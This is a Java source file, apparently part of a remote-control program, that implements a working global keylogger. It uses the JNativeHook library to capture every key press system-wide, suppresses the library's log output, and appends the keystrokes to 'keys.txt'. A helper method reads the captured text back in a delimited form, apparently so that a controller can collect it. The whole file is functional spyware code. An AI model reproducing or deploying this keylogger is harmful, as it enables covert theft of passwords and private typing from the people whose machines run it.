package Control;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;


/**
 * @author dell
 */
public class KeyLogger implements NativeKeyListener {

    private static final Path file = Paths.get("keys.txt");
    private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

    public  void startKeyLogger(){
        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.out.println("Cannot start keylogger");
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
        System.out.println("Keylogger started");
    }
    private static void init() {
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
            } else {
                writer.print(keyText);
            }

        } catch (IOException ex) {
            System.out.println("Keylogger: Read/write failed");
        }
    }
    public static String getKeyloggerData() {
        StringBuilder result = new StringBuilder();
        try {
            FileInputStream fis = new FileInputStream(String.valueOf(file));
            BufferedReader br = new BufferedReader (new InputStreamReader(fis));

            String currentLine;
            while ((currentLine = br.readLine()) != null){
                result.append(currentLine).append("@@@&&&");
            }
            fis.close();
            br.close();
        } catch (FileNotFoundException fnf) {
            System.out.println("Cannot find file: " + String.valueOf(file));
        } catch (IOException ioe) {
            System.out.println("Cannot load file");
        }
        return result.toString().replace("\n","@@@&&&");
    }
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    public static void main(String[] args) {
        System.out.println(getKeyloggerData());
    }
}